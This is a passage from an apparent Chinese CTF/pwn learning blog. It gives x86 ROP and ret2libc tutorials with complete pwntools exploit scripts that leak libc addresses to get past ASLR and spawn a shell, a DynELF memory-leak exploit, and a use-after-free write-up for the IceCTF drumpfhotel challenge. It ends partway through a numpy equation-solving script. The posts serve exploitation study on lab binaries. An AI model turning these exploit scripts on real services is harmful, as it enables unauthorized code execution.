</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./level2&apos;)
#p = remote(&apos;127.0.0.1&apos;,10002)

ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8

payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()
</code></pre><h2 id="ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h2><p>接下来我们打开ASLR保护。</p>
<pre><code>sudo -s 
echo 2 &gt; /proc/sys/kernel/randomize_va_space
</code></pre><p>从现在开始会发现test的libc.so的地址每次都会变化。</p>
<p>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。</p>
<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
<p><img src="http://p1.bqimg.com/567571/6448270ab01e52b6.png" alt=""></p>
<p><img src="http://p1.bqimg.com/567571/c0f9f3cc460b2922.png" alt=""></p>
<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。</p>
<p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
<p><img src="http://i1.piimg.com/567571/e6d4d1d7b8b7e1ed.png" alt=""></p>
<p>最后的exp：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)
elf = ELF(&apos;test3&apos;)

p = process(&apos;./test3&apos;)
#p = remote(&apos;127.0.0.1&apos;, 10003)

plt_write = elf.symbols[&apos;write&apos;]
print &apos;plt_write= &apos; + hex(plt_write)
got_write = elf.got[&apos;write&apos;]
print &apos;got_write= &apos; + hex(got_write)
vulfun_addr = 0x0804844d
print &apos;vulfun= &apos; + hex(vulfun_addr)

payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

print &quot;\n###sending payload1 ...###&quot;
p.send(payload1)

print &quot;\n###receving write() addr...###&quot;
write_addr = u32(p.recv(4))
print &apos;write_addr=&apos; + hex(write_addr)

print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
print &apos;system_addr= &apos; + hex(system_addr)
binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
print &apos;binsh_addr= &apos; + hex(binsh_addr)

payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print &quot;\n###sending payload2 ...###&quot;
p.send(payload2)

p.interactive()
</code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要介绍了x86——ROP攻击的基本原理,希望能帮到大家</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn学习之DynELF的使用</title>
    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
def leak(address):
    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
return data
</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
<pre><code>da$ disassemble vlun_fun 
Dump of assembler code for function vlun_fun:
   0x0804844d &lt;+0&gt;:    push   ebp
   0x0804844e &lt;+1&gt;:    mov    ebp,esp
   0x08048450 &lt;+3&gt;:    sub    esp,0x98
   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
   0x08048474 &lt;+39&gt;:    leave  
   0x08048475 &lt;+40&gt;:    ret    
</code></pre><p>和明显地址是0x0804844d</p>
<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *
elf = ELF(&apos;./test2&apos;)
plt_write = elf.symbols[&apos;write&apos;]
plt_read = elf.symbols[&apos;read&apos;]
vulfun_addr = 0x0804844d

def leak(address):
    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
    return data
p = process(&apos;./test2&apos;)
gdb.attach(p,&quot;b *0x804850d&quot;)
#p = remote(&apos;127.0.0.1&apos;, 10002)
d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
print &quot;system_addr=&quot; + hex(system_addr)
bss_addr = 0x0804a024
pppr = 0x804850d
payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
payload2 += &apos;C&apos; * (256 - len(payload2))
#ss = raw_input()
print &quot;\n###sending payload2 ...###&quot;
p.send(payload2)
p.send(&quot;/bin/sh\0&quot;)
p.interactive()
</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn第一更-Icectf_drumpfhotel</title>
    <url>/2016/11/08/pwn%E7%AC%AC%E4%B8%80%E6%9B%B4-Icectf-drumpfhotel/</url>
    <content><![CDATA[<p>最近在刷题的时候发现的一道相对简单的溢出题目，但是可能对堆溢出方面知识涉及的不多，导致花了不少时间去研究原理，感觉还有有不少收获的。<br><a id="more"></a></p>
<p>代开界面就是一个简单的宾馆预定系统</p>
<p>使用IDA分析函数，主要的函数包括mian(),book_suite(),book_room(),delete_booking(),print_booking()还有最主要的flag().</p>
<p>首先在main函数里会给个五个选择，预定suite、room，删除预定，打印预定，退出。</p>
<p>首先分析book_suite(),大致的情形就是在堆上申请了264个字节的空间，前四个字节储存print_name()函数，256个字节储存name，另外四个存储suite nummber。</p>
<pre><code>Dump of assembler code for function book_suite:
   0x0804873b &lt;+0&gt;: push   %ebp
   0x0804873c &lt;+1&gt;: mov    %esp,%ebp
   0x0804873e &lt;+3&gt;: push   %ebx
   0x0804873f &lt;+4&gt;: sub    $0x34,%esp
   0x08048742 &lt;+7&gt;: mov    %gs:0x14,%eax
   0x08048748 &lt;+13&gt;: mov    %eax,-0xc(%ebp)
   0x0804874b &lt;+16&gt;: xor    %eax,%eax
   0x0804874d &lt;+18&gt;: movl   $0x108,(%esp)   --&gt;Allocate 264 bytes in heap memory
   0x08048754 &lt;+25&gt;: call   0x80484e0 &lt;malloc@plt&gt; --&gt; return ptr to memory in eax
   0x08048759 &lt;+30&gt;: mov    %eax,0x804b088  --&gt; assign ptr to variable suite
   0x0804875e &lt;+35&gt;: movl   $0x8049688,(%esp)
   0x08048765 &lt;+42&gt;: call   0x8048490 &lt;printf@plt&gt; --&gt; print &quot;Name:&quot;
   0x0804876a &lt;+47&gt;: mov    0x804b080,%eax
   0x0804876f &lt;+52&gt;: mov    %eax,(%esp)
   0x08048772 &lt;+55&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048777 &lt;+60&gt;: mov    0x804b060,%eax
   0x0804877c &lt;+65&gt;: mov    0x804b088,%edx  --&gt; variable suite
   0x08048782 &lt;+71&gt;: add    $0x4,%edx
   0x08048785 &lt;+74&gt;: mov    %eax,0x8(%esp)
   0x08048789 &lt;+78&gt;: movl   $0x100,0x4(%esp)--&gt; length 0x100(256 bytes)
   0x08048791 &lt;+86&gt;: mov    %edx,(%esp)   
   0x08048794 &lt;+89&gt;: call   0x80484c0 &lt;fgets@plt&gt;--&gt; read from stdin, store name at address suite+4, length 0x100(256 bytes)
   0x08048799 &lt;+94&gt;: mov    0x804b088,%eax  --&gt; var suite into eax
   0x0804879e &lt;+99&gt;: movl   $0x8048a84,(%eax)--&gt; store address of print_name function(0x8048a84) into memory location at suite
   0x080487a4 &lt;+105&gt;: movl   $0x804968f,(%esp)     --&gt;&quot;Suite number:&quot;
   0x080487ab &lt;+112&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x080487b0 &lt;+117&gt;: mov    0x804b080,%eax
   0x080487b5 &lt;+122&gt;: mov    %eax,(%esp)
   0x080487b8 &lt;+125&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x080487bd &lt;+130&gt;: mov    0x804b060,%eax   --&gt;stdin
   0x080487c2 &lt;+135&gt;: mov    %eax,0x8(%esp)   --&gt;push stdin stream
   0x080487c6 &lt;+139&gt;: movl   $0x10,0x4(%esp)  --&gt;read only 16bytes from stdin. *Cannot stack overflow*
   0x080487ce &lt;+147&gt;: lea    -0x1c(%ebp),%eax --&gt;store in stack starting at $ebp-0x1c (28bytes away from base of stack)
   0x080487d1 &lt;+150&gt;: mov    %eax,(%esp)
   0x080487d4 &lt;+153&gt;: call   0x80484c0 &lt;fgets@plt&gt; --&gt; get suite number from stdin and store in stack
   0x080487d9 &lt;+158&gt;: mov    0x804b088,%ebx   --&gt; pointer suite
   0x080487df &lt;+164&gt;: lea    -0x1c(%ebp),%eax
   0x080487e2 &lt;+167&gt;: mov    %eax,(%esp)      
   0x080487e5 &lt;+170&gt;: call   0x8048530 &lt;atoi@plt&gt;
   0x080487ea &lt;+175&gt;: mov    %eax,0x104(%ebx)--&gt; save integer result into  suite+0x104
   0x080487f0 &lt;+181&gt;: movl   $0x804969e,(%esp)  --&gt; &quot;Booked a suite!&quot;
   0x080487f7 &lt;+188&gt;: call   0x80484f0 &lt;puts@plt&gt;
   0x080487fc &lt;+193&gt;: mov    0x804b080,%eax
   0x08048801 &lt;+198&gt;: mov    %eax,(%esp)
   0x08048804 &lt;+201&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048809 &lt;+206&gt;: mov    -0xc(%ebp),%eax  --&gt;Stack canary
   0x0804880c &lt;+209&gt;: xor    %gs:0x14,%eax
   0x08048813 &lt;+216&gt;: je     0x804881a &lt;book_suite+223&gt;
   0x08048815 &lt;+218&gt;: call   0x80484d0 &lt;__stack_chk_fail@plt&gt;
   0x0804881a &lt;+223&gt;: add    $0x34,%esp
   0x0804881d &lt;+226&gt;: pop    %ebx
   0x0804881e &lt;+227&gt;: pop    %ebp
   0x0804881f &lt;+228&gt;: ret    
End of assembler dump.
</code></pre><p>使用gdb查看堆地址分配，第一个地址就是print_name()函数的地址。</p>
<pre><code>(gdb) x/100wx suite
0x804c008: 0x08048a84(func) 0x62626262 0x00000a62 0x00000000
0x804c018: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c028: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c038: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c048: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c058: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c068: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c078: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c088: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c098: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0a8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0b8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0c8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0d8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0e8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0f8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c108: 0x00000000 0x0804863d(int) 0x00000000 0x00020ef1
0x804c118: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c128: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c138: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c148: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c158: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c168: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c178: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c188: 0x00000000 0x00000000 0x00000000 0x00000000
</code></pre><p>接下里是book_room函数，分配了大小为260的堆内存，256大小的向内存储存name，剩下4个字节储存room_nummber.</p>
<pre><code>(gdb) disass book_room
Dump of assembler code for function book_room:
   0x08048820 &lt;+0&gt;: push   %ebp
   0x08048821 &lt;+1&gt;: mov    %esp,%ebp
   0x08048823 &lt;+3&gt;: push   %ebx
   0x08048824 &lt;+4&gt;: sub    $0x34,%esp
   0x08048827 &lt;+7&gt;: mov    %gs:0x14,%eax
   0x0804882d &lt;+13&gt;: mov    %eax,-0xc(%ebp)
   0x08048830 &lt;+16&gt;: xor    %eax,%eax
   0x08048832 &lt;+18&gt;: movl   $0x104,(%esp)   
   0x08048839 &lt;+25&gt;: call   0x80484e0 &lt;malloc@plt&gt;--&gt; allocate 260 bytes in heap
   0x0804883e &lt;+30&gt;: mov    %eax,0x804b08c  --&gt; save pointer to variable room 
   0x08048843 &lt;+35&gt;: movl   $0x8049688,(%esp) --&gt; &quot;Name: &quot;
   0x0804884a &lt;+42&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x0804884f &lt;+47&gt;: mov    0x804b080,%eax
   0x08048854 &lt;+52&gt;: mov    %eax,(%esp)
   0x08048857 &lt;+55&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x0804885c &lt;+60&gt;: mov    0x804b060,%eax
   0x08048861 &lt;+65&gt;: mov    0x804b08c,%edx --&gt; variable room
   0x08048867 &lt;+71&gt;: add    $0x4,%edx
   0x0804886a &lt;+74&gt;: mov    %eax,0x8(%esp)
   0x0804886e &lt;+78&gt;: movl   $0x100,0x4(%esp)
   0x08048876 &lt;+86&gt;: mov    %edx,(%esp)
   0x08048879 &lt;+89&gt;: call   0x80484c0 &lt;fgets@plt&gt; --&gt; read from stdin, store name at address room+4, length 0x100(256 bytes)
   0x0804887e &lt;+94&gt;: movl   $0x80496ae,(%esp)  --&gt; &quot;Room Number: &quot;
   0x08048885 &lt;+101&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x0804888a &lt;+106&gt;: mov    0x804b080,%eax
   0x0804888f &lt;+111&gt;: mov    %eax,(%esp)
   0x08048892 &lt;+114&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048897 &lt;+119&gt;: mov    0x804b060,%eax
   0x0804889c &lt;+124&gt;: mov    %eax,0x8(%esp)
   0x080488a0 &lt;+128&gt;: movl   $0x10,0x4(%esp)  --&gt; read 16 bytes
   0x080488a8 &lt;+136&gt;: lea    -0x1c(%ebp),%eax 
   0x080488ab &lt;+139&gt;: mov    %eax,(%esp)
   0x080488ae &lt;+142&gt;: call   0x80484c0 &lt;fgets@plt&gt;
   0x080488b3 &lt;+147&gt;: mov    0x804b08c,%ebx
   0x080488b9 &lt;+153&gt;: lea    -0x1c(%ebp),%eax
   0x080488bc &lt;+156&gt;: mov    %eax,(%esp)
   0x080488bf &lt;+159&gt;: call   0x8048530 &lt;atoi@plt&gt;
   0x080488c4 &lt;+164&gt;: mov    %eax,(%ebx)  --&gt; save room number into address room
   0x080488c6 &lt;+166&gt;: movl   $0x80496bc,(%esp)
   0x080488cd &lt;+173&gt;: call   0x80484f0 &lt;puts@plt&gt; &quot;Booked a room!&quot;
   0x080488d2 &lt;+178&gt;: mov    0x804b080,%eax
   0x080488d7 &lt;+183&gt;: mov    %eax,(%esp)
   0x080488da &lt;+186&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x080488df &lt;+191&gt;: mov    -0xc(%ebp),%eax
   0x080488e2 &lt;+194&gt;: xor    %gs:0x14,%eax
   0x080488e9 &lt;+201&gt;: je     0x80488f0 &lt;book_room+208&gt;
   0x080488eb &lt;+203&gt;: call   0x80484d0 &lt;__stack_chk_fail@plt&gt;
   0x080488f0 &lt;+208&gt;: add    $0x34,%esp
   0x080488f3 &lt;+211&gt;: pop    %ebx
   0x080488f4 &lt;+212&gt;: pop    %ebp
   0x080488f5 &lt;+213&gt;: ret    
End of assembler dump.
(gdb) 
</code></pre><p>查看堆结构，发现前四个字节储存的就是room_nummber</p>
<pre><code>(gdb) x/100wx room
0x804c008: 0x00000001(int) 0x61616161 0x00000a61 0x00000000
0x804c018: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c028: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c038: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c048: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c058: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c068: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c078: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c088: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c098: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0a8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0b8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0c8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0d8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0e8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0f8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c108: 0x00000000 0x00020ef9 0x00000000 0x00000000
0x804c118: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c128: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c138: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c148: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c158: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c168: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c178: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c188: 0x00000000 0x00000000 0x00000000 0x00000000
</code></pre><p>主要的问题在print_booking中，这个函数里调用了print_name函数</p>
<pre><code>(gdb) disass print_booking
Dump of assembler code for function print_booking:
   0x080489a5 &lt;+0&gt;: push   %ebp
   0x080489a6 &lt;+1&gt;: mov    %esp,%ebp
   0x080489a8 &lt;+3&gt;: sub    $0x28,%esp
   0x080489ab &lt;+6&gt;: mov    %gs:0x14,%eax
   0x080489b1 &lt;+12&gt;: mov    %eax,-0xc(%ebp)
   0x080489b4 &lt;+15&gt;: xor    %eax,%eax
   0x080489b6 &lt;+17&gt;: mov    0x804b088,%eax  --&gt; pointer suite
   0x080489bb &lt;+22&gt;: test   %eax,%eax
   0x080489bd &lt;+24&gt;: jne    0x80489e6 &lt;print_booking+65&gt;
   0x080489bf &lt;+26&gt;: mov    0x804b08c,%eax
   0x080489c4 &lt;+31&gt;: test   %eax,%eax
   0x080489c6 &lt;+33&gt;: jne    0x80489e6 &lt;print_booking+65&gt;
   0x080489c8 &lt;+35&gt;: movl   $0x80496cb,(%esp)
   0x080489cf &lt;+42&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x080489d4 &lt;+47&gt;: mov    0x804b080,%eax
   0x080489d9 &lt;+52&gt;: mov    %eax,(%esp)
   0x080489dc &lt;+55&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x080489e1 &lt;+60&gt;: jmp    0x8048a71 &lt;print_booking+204&gt;
   0x080489e6 &lt;+65&gt;: mov    0x804b088,%eax --&gt; pointer suite
   0x080489eb &lt;+70&gt;: test   %eax,%eax
   0x080489ed &lt;+72&gt;: je     0x8048a2c &lt;print_booking+135&gt;
   0x080489ef &lt;+74&gt;: mov    0x804b088,%eax
   0x080489f4 &lt;+79&gt;: mov    (%eax),%eax --&gt;address of print_name function in suite
   0x080489f6 &lt;+81&gt;: mov    0x804b088,%edx
   0x080489fc &lt;+87&gt;: add    $0x4,%edx
   0x080489ff &lt;+90&gt;: mov    %edx,(%esp) --&gt; location of string for suite name
   0x08048a02 &lt;+93&gt;: call   *%eax --&gt; call print_name function giving it location of suite name **Need to overwrite value of print_name function in suite with address of function flag()
   0x08048a04 &lt;+95&gt;: mov    0x804b088,%eax
   0x08048a09 &lt;+100&gt;: mov    0x104(%eax),%eax
   0x08048a0f &lt;+106&gt;: mov    %eax,0x4(%esp)
   0x08048a13 &lt;+110&gt;: movl   $0x804970a,(%esp)
   0x08048a1a &lt;+117&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x08048a1f &lt;+122&gt;: mov    0x804b080,%eax
   0x08048a24 &lt;+127&gt;: mov    %eax,(%esp)
   0x08048a27 &lt;+130&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048a2c &lt;+135&gt;: mov    0x804b08c,%eax
   0x08048a31 &lt;+140&gt;: test   %eax,%eax
   0x08048a33 &lt;+142&gt;: je     0x8048a71 &lt;print_booking+204&gt;
   0x08048a35 &lt;+144&gt;: mov    0x804b08c,%eax
   0x08048a3a &lt;+149&gt;: add    $0x4,%eax
   0x08048a3d &lt;+152&gt;: mov    %eax,0x4(%esp)
   0x08048a41 &lt;+156&gt;: movl   $0x804971c,(%esp)
   0x08048a48 &lt;+163&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x08048a4d &lt;+168&gt;: mov    0x804b08c,%eax
   0x08048a52 &lt;+173&gt;: mov    (%eax),%eax
   0x08048a54 &lt;+175&gt;: mov    %eax,0x4(%esp)
   0x08048a58 &lt;+179&gt;: movl   $0x804970a,(%esp)
   0x08048a5f &lt;+186&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x08048a64 &lt;+191&gt;: mov    0x804b080,%eax
   0x08048a69 &lt;+196&gt;: mov    %eax,(%esp)
   0x08048a6c &lt;+199&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048a71 &lt;+204&gt;: mov    -0xc(%ebp),%eax
   0x08048a74 &lt;+207&gt;: xor    %gs:0x14,%eax
   0x08048a7b &lt;+214&gt;: je     0x8048a82 &lt;print_booking+221&gt;
   0x08048a7d &lt;+216&gt;: call   0x80484d0 &lt;__stack_chk_fail@plt&gt;
   0x08048a82 &lt;+221&gt;: leave  
   0x08048a83 &lt;+222&gt;: ret    
End of assembler dump.
(gdb)  
</code></pre><p>之后的delete_booking()函数主要是free()堆块，利用过程就是首先为suite申请堆块，然后free掉，之后为room申请堆块，nummber处输入flag()地址的十进制，这样suite和room的前四个字节都指向同一个地址，造成room前四个字节地址指针混乱，而suite()的print_name()函数地址被转换为flag()地址。</p>
<p><img src="http://i1.piimg.com/567571/14380bddf3869ff4.png" alt=""></p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>python基于numpy解方程组</title>
    <url>/2016/11/28/python%E5%9F%BA%E4%BA%8Enumpy%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
    <content><![CDATA[<p>前两天在做hctf的时候遇到一个题目，前年的400分，通过IDA分析可以看出就是一个有22个未知数的方程组的求解。<br><a id="more"></a></p>
<p>看了前年的writeup加上一位大牛的指点，通过numpy这个包写了python脚本，终于得到了flag。</p>
<pre><code>import sys
import numpy
verify=[
0x83CD50,
0x706048,
0xA9AC74,
0x9A4AF2,
0x9F79A0,
0x7F51A2,
0x7E4CD8,
0x7038B0,
0x7B3708,
0x687078,
0x806066,
0x8F2F2E,
0x928B34,
0x7FEDDC,
0x825768,
0xACB91E,
0x90402E,
0x6F7386,
0xA01C72,
0x7C7250,
0x7AB115,
0x893C38
]//这一个数组里包含的是方程组的结果
matrix=[[8923, 659, 1303, 1949, 4447, 3527, 757, 367, 5507, 7907, 691, 9629, 5303, 8117, 9103, 9391, 89, 3361, 751, 9067, 5417, 6829],
        [9067, 1259, 107, 8597, 4229, 1213, 8831, 3259, 269, 5323, 769, 1237, 5501, 6763, 8053, 67, 3163, 3863, 4447, 5569, 4357, 5503],
        [9533, 23, 1973, 8269, 6961, 8929, 6301, 2791, 4861, 8053, 1609, 8219, 911, 7583, 6143, 2953, 7247, 6131, 7853, 4451, 7187, 8629],
        [1039, 389, 1487, 5987, 937, 239, 3583, 2897, 8893, 3307, 7459, 8521, 9769, 9689, 6959, 7949, 9137, 3461, 4229, 9059, 7177, 7643],
        [7853, 6271, 9371, 1613, 73, 8243, 9013, 919, 5387, 2207, 6211, 139, 5077, 7211, 2053, 8443, 4421, 5717, 8779, 8971, 6337, 7159],
        [3019, 8377, 1613, 1973, 3923, 8821, 797, 4969, 7643, 7297, 2381, 4679, 5869, 647, 7411, 3329, 6199, 7349, 4969, 8731, 877, 1039],
        [3089, 9859, 7159, 227, 271, 8161, 1051, 5701, 1259, 1361, 3673, 8311, 4679, 7877, 2621, 991, 9949, 683, 743, 6079, 2473, 4519],
        [1259, 4651, 5479, 4951, 4657, 4591, 509, 3821, 6661, 4127, 2011, 4547, 7621, 5261, 5261, 2003, 4871, 457, 2083, 4561, 6947, 1187],
        [4703, 9629, 3769, 2003, 1297, 4283, 2381, 8429, 7057, 9371, 4483, 4099, 1873, 499, 7583, 5897, 937, 727, 241, 4799, 6361, 5531],
        [283, 5591, 151, 2113, 7229, 307, 3851, 8963, 2777, 7757, 8831, 17, 8563, 1543, 8243, 3529, 3833, 2411, 2897, 19, 3559, 853],
        [9467, 2207, 2269, 2083, 7741, 5801, 2633, 349, 9257, 479, 331, 7649, 5393, 887, 6329, 4243, 3329, 7121, 4001, 6043, 8263, 3253],
        [4993, 7577, 6833, 661, 4129, 67, 2791, 3121, 4597, 8053, 8147, 1619, 5801, 6173, 127, 8179, 8093, 9319, 1063, 9157, 7817, 2341],
        [1493, 9137,9787, 617, 5557, 8387, 4219, 3301, 251, 3203, 8443, 2521, 2887, 2437, 7883, 5653, 3907, 4457, 9091, 523, 887, 8101],
        [9467, 2251, 9067, 4153,557, 4999, 5669, 9343, 7949, 7019, 113, 1801, 1867, 1187, 3541, 5527, 2347, 4813, 3019, 683, 6869, 5051],
        [7333, 8677, 3557, 4099, 5279, 449, 2099, 8929, 5393, 1933,9157, 6827, 467, 3299, 443, 3739, 823, 7499, 691, 2467, 281, 4049],
        [7489,739, 9769, 7963, 5651, 7691, 947, 8537, 4943, 1187, 4651, 9011, 6359, 1063, 7541, 9187, 2551, 7649, 4001, 3187, 6199, 7433],
